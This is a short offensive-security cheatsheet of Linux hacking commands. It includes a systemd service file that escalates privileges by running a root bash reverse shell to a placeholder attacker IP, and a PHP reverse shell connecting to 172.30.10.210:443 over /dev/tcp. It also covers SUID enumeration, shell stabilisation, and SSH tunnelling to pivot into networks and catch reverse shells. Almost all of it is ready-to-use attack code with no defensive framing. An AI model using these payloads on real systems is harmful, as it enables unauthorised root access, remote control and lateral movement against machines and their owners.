# Linux Hacking Cheatsheet

## Find SUID bits
`find / -perm -u=s -type f 2>/dev/null`
`find / -user root -perm -4000 -exec ls -ldb {} \;`

## Priv Esc systemctl with user access
_Create protection.service file in writable directory_
```
[Unit]
Discription=Does very important stuff mmmkay

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1'

[Install]
WantedBy=multi-user.target
```

## Escaping no tty shell 
`/usr/bin/script -qc /bin/bash /dev/null`

_try ctrl + z_

`stty raw -echo`

`fg`

`export TERM=xterm #autocomplete`

## Find human readable strings in binary
`strings /usr/bin/menu`

## PHP reverse shell
```
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/172.30.10.210/443 0>&1'");
```

## Grep IPs out of file
`grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" file.txt`

## Search for keyword
`grep -ri "word" /`

## Edit Wifi Connections
`nmtui`

_or_

`nmcli`

## Spin up webserver
`python -m SimpleHTTPServer 80`

## SSH Port Forwarding

`ssh -D localhost:9999 -f -N root@172.30.72.97 -p 40384`

__*edit proxychains .conf file to connect over socks5 127.0.0.1 9999__

_or_

~C "if you already have an SSH session"

-R 8081:172.24.0.2:80 (on my Kali machine listen on 8081, get it from 172.24.0.2:80)
<KALI 10.1.1.1>:8081<------------<REMOTE 172.24.0.2>:80
Now you can access 172.24.0.2:80, which you didn't have direct access to


-L 8083:127.0.0.1:8084 (on your machine listen on 8083, send it to my Kali machine on 8084)
<KALI 127.0.0.1>:8084<------------<REMOTE 10.1.1.230>:8083<------------<REMOTE X.X.X.X>:XXXX
run nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will get it